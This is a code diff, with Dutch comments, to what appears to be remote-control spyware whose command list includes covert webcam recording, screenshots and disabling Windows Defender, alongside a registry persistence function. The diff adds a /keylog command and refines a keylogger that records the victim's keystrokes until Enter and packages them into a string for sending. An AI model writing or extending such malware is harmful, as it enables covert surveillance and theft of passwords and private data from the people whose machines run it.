@@ -57,6 +57,7 @@ Command Lijst:
 /webcam         -   Maak een 5 seconde webcam opname
 /ss             -   Maak een screenshot van het scherm
 /stopdefender   -   Windows Defender uitgeschakelen
+/keylog         -   luister naar keyboard toetsen totdat de gebruiker enter klikt
 """
 
 # path en naam voor het opslaan van media
@@ -170,24 +171,25 @@ def add_to_registry(program_name):
 # key logger
 inputList = []
 
+# slaat keyboard toetsen opin een lijst, zorgt ervoor dat shift niet in de lijst blijft. en stopt de keylogger met enter
 def log_a_string(key):
     global inputList
 
     try:
         # de logger stoppen als enter geklikt wordt
-        if key == keyboard.Key.enter:
+        if key == key.enter:
             # delete Key.shift uit de list, als het voorkomt in de list
-            for item in inputList:
-                if item == 'Key.shift':
-                    inputList.remove(item)
+            while 'Key.shift' in inputList:
+                inputList.remove('Key.shift')
             return False
         
         # spatie toevoegen als het gebruikt wordt
-        if key == key.space:
+        elif key == key.space:
             inputList.append(" ")
 
-        # bij backspace de laatste item uit de lijst halen
-        if key == key.backspace:
+        # als backspace geklikt wordt, en er staat iets in de list
+        elif key == key.backspace and len(inputList) > 0:
+            # haal dan de laatste item uit de list
             inputList.pop(-1)
         
         # voor letters en cijfers
@@ -198,10 +200,17 @@ def log_a_string(key):
     except AttributeError:
         inputList.append(format(key))
 
+# start keylogging. na enter maakt het een string van de lijst
 def key_log():
     # Collect events until released
     with keyboard.Listener(on_press=log_a_string) as listener:
         listener.join()
     
+    send_string = ''.join(inputList).replace("'", "")
+
+    # maak de lijst leeg voor de volgende keer
+    inputList.clear()
+    
     # return een list zonder aanhalings tekens
-    return ''.join(inputList).replace("'", "")
+    return send_string
+
